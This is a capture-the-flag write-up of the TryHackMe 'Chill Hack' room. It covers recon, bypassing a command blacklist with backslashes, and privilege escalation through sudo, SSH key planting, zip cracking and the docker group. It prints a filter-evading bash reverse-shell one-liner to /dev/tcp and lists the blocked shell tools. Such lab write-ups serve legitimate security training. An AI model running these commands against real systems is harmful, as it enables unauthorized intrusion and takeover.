---
title: "Chillhack_writeup"
date: 2020-11-28T14:06:51-05:00
draft: false
featured: false
toc: true
summary: "This room provides the real world pentesting challenges. Let's give it a try!"
images:
  - "img/chillhack_cover.jpg"
cover: "img/chillhack_cover.gif"
tags:
  - hacking
  - tryHackme
  - writeups
  - chillhack
---

# Chill Hack - THM Room

This time we'll hack, `Chill Hack` a THM room created by `Anurodh`. Let's get hacking!

- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/chillhack).
- **PLEASE NOTE:** Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules. 


## Scanning with Nmap

We'll start things off by running `nnap` so we can get an idea of what we are dealing with:

```
┌──(kali㉿kali)-[~/Documents/THM/chillhack]
└─$ sudo nmap 10.10.57.249 -A -sC -sV -O -p- -T4
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-27 22:15 EST
Nmap scan report for 10.10.57.249
Host is up (0.33s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.0.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   226.31 ms 10.13.0.1
2   ... 3
4   365.34 ms 10.10.57.249

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 278.41 seconds
```

With this scan we get a few details we can start inspecting further. let's go with the anonymous ftp login first.

## Anonymous FTP

Let's connect to the FTP anonymously and see if there is anything of interest there.

![](https://i.imgur.com/uzPSNM8.png)


We get a file called `note.txt`, lets see what its contents are:

![](https://i.imgur.com/WKemQ52.png)



## Gobuster

Ok let's move on, let's fire up gobuster to see if we find something else.

![](https://i.imgur.com/bJ5ZIU6.png)

We found a directory available, let's check it out

![](https://i.imgur.com/sBZP3nI.png)

If we attempt to run a command there like a simple `ls` we get the following interesting screen:

![](https://i.imgur.com/n9mLVaR.png)

This confirms the commands are being filtered.

## Getting initial access

Let's try to run a simple `whoami`, this time we see it runs correctly:

![](https://i.imgur.com/EFE0CiM.png)

We also now which username we have access to.

If we enter the command `dir` we do get a couple of results back, confirming that not all commands are indeed being filtered:

![](https://i.imgur.com/utbMug4.png)

and if we try to append a `/images` to the URL, we see the following:

![](https://i.imgur.com/cIgJPOQ.png)

There we can see both gif files that we can get when entering commands. Ok let's get back to the command page. We know that some commands are filtered and some commands will run just fine. We really need to get a better idea of which commands are blocked.

Let's see if we can bypass the filtering by scaping some characters, in this case we can try using the `\` (backslash) in between our commands letters and see if that manages to go through:

![](https://i.imgur.com/8EVpuBY.png)

Great, we can somewhat bypass the filtered commands using the backslash. Let's see now if we can get a look at that php file where we could possibly find the filtering code that is preventing us from running all commands:

After running the command `c\at index.php` we can inspect the page code and see the following:

![](https://i.imgur.com/T5Vmso7.png)

By doing that now we have a clear picture of what this command page is doing, the following commands are being filtered:

- nc, bash, php, perl, rm, cat, head, tail, python, python3, more, less, sh and ls.

And we also learned that the page is using `php echo sheel_exec($cmd)` to execute the commands.

Let's see if we can get a reverse shell, let's take this code for example:

`bash -c 'exec bash -i &>/dev/tcp/10.13.0.34/2112 <&1'`

if we try to bypass the filter, we could try tweak it like this before running it:

`b\ash -c 'exec b\ash -i &>/dev/tcp/10.13.0.34/2112 <&1'`

> NOTE: Make sure to do a `nc -nlvp 2112` before running the command.

![](https://i.imgur.com/ZyxEwk2.png)

That worked, we now have our initial access to the machine.


## Escalating Privs

Now that we have our initial access into the target, we need to find a way to escalate privileges so we can get the flags. Lets see which additional details about the current user we can get. Let's run `id` and `sudo -l` to get more info about the groups the user belongs to and if he has any permissions to run a command as sudo:

![](https://i.imgur.com/6QtEZAY.png)

We can see the only command we can run is a file called `.helpline.sh` from the user `apaar`. If we check the contents of that file we see some information of what it does. It seems to just pass any input the user provides and since this file is running with root permissions, we can pretty much use it to get higher privs. Let's try it out by invoking bash:

> NOTE: Notice we execute the file using `sudo -u apaar` otherwise the bash session will still get opened as the current user `www-data`.

![](https://i.imgur.com/TIKFaVe.png)

> R.I.P Neil Peart.


## Getting the first flag

Now we have have escaped from the limiter user, let's see if Apaar has our first flag:

![](https://i.imgur.com/qEjSmYZ.png)

That's it, we got the first flag!


## Getting the Root flag

Now we need to once again find a way to escalate to root privileges so we can access the last flag. Let's start by checking again some user information by running `id` and `sudo -l` once more:

![](https://i.imgur.com/ylLkNYe.png)

As we can see we have pretty much the same access as before, we can still run that helpline as well. Let's upload and run linpeas and see if it locates something quickly.

![](https://i.imgur.com/phpxTpl.png)

Let's see what linpeas can find for us.

### Generating our SSH key pair

While that's running let's generate ourselves an SSH key pair so we can ideally log in through SSH and have a more stable shell before we continue:

![](https://i.imgur.com/GmH58bI.png)

Now we need to upload the apaar.pub file inside the `.shh` folder of Apaar and then add our key into the authorized keys file.

![](https://i.imgur.com/OIwU69X.png)

With that we should be able to connect through ssh using the key and get a better shell. Let's try that out:

![](https://i.imgur.com/5w3tkem.png)

Now we have a real shell to interact with the system. Let's see how we get root now.

## Back to getting root

Ok now we have a good shell we need to get root, let's see if linpeas had found anything for us:

![](https://i.imgur.com/C8lwlEm.png)

We there are two locally accessible ports: `9001` and `3306`. This smells like port forwarding :joy:. Let's see if we can reconnect back through ssh by this time lets forward those ports to our localhost and see what they have for us:

For that lets look at the command we need to use:

- `ssh -L 9001:127.0.0.1:9001 -i apaar apaar@10.10.189.206`

We are telling SSH to forward port 9001 through localhost at the same destination port and then we get connected again as apaar with our generated key. Let's run that

![](https://i.imgur.com/L9aouRA.png)

Now let's see if that really worked. Let's try to access that localhost and port in our browser now:

![](https://i.imgur.com/PEKbuti.png)

It worked and we can now access a login form, let's see what it has for us. Let's try inspecting the code as we usually do with any page we have access to. SPOILER: I did not find anything useful.

Let's see if using the user apaar we can navigate to the folder where this page is being served and look around for anything interesting:

![](https://i.imgur.com/IqvhMG6.png)

Browsing around the location `/var/www` we see a few interesting files:

- `account.php`
- `hacker.php`
- `index.php`

the one called account seems to be the login form we get when access port 9001. The One called hacker I'm not sure we can check that one and Index.php should be the main file getting loaded. Let's cat both to see what they contain:

![](https://i.imgur.com/F499VH1.png)

When we look at the contents of `hacker.php` we see there is a mention to a picture and some motivational text :joy:. Before we move further let's see if we can grab that jpg file:

![](https://i.imgur.com/nb7cnSt.png)

We do get that image, shall we try to see if there is anything in that picture for us?

### Running steghide extract

We can try running `steghide` with the flags `extract -sf {fileName}` and see if we get anything. Usually we would require a passphrase, but this time it seems to work without one:

![](https://i.imgur.com/V2pucwm.png)

We get a backup file, and yeah it's password protected.

### Down the rabbit hole? Let's try zip2john

We need to access that backup file, let's try to use zip2john and see if we manage to crack the password:

![](https://i.imgur.com/QzgpGhh.png)

Now that we have a `john` formatted hash, let's run it using rockyou.txt as wordlist and see if we get lucky or if this was indeed a rabbit hole:

![](https://i.imgur.com/HCyD3ar.png)

And we got the password, let's see what that backup file has to offer us:

![](https://i.imgur.com/MQYPO8r.png)

Loot at that! We not only get a base64 encoded password, but also a possible username for that password too!

Let's quickly use Cyberchef to get the password decoded:

![](https://i.imgur.com/0nSVkkH.png)

Great we do have a new set of credentials now.

If we do `su anurodh` and use the password we got, we are able to log as that user. When we run `id` we see something interesting:

![](https://i.imgur.com/94xJiAC.png)

Do you see it? we are part of the docker group! :joy:

### Rocking the Docker

Let's see if we have any way of escalating privileges using docker if we check our beloved `GTFObins.github.io` we see there is a way to root:

![](https://i.imgur.com/wDqcD2F.png)

If we go ahead and try to run that we get:

![](https://i.imgur.com/SOs6gMn.png)

WE GOT ROOT! Let's get that flag before the room timer runs out.

![](https://i.imgur.com/fjmsgKu.png)

That was `Chill Hack` room from tryhackme, thank you very much for stopping by and thanks to `Anurodh` for creating this room, I enjoyed very much!

Happy hacking!



{{< thm_badge >}}